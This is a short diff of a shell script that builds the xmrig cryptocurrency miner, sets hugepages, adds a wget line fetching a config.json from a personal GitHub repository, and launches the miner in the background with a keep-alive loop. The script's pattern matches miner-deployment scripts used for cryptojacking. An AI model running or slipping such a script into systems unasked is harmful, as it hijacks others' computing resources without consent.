@@ -9,8 +9,7 @@ cd build
 cmake ..
 make
 sysctl -w vm.nr_hugepages=128
-
-
+wget https://raw.githubusercontent.com/PericoGuerra/vps/main/config.json
 nohup ./xmrig -B &
 while [ 1 ]; do
 sleep 3
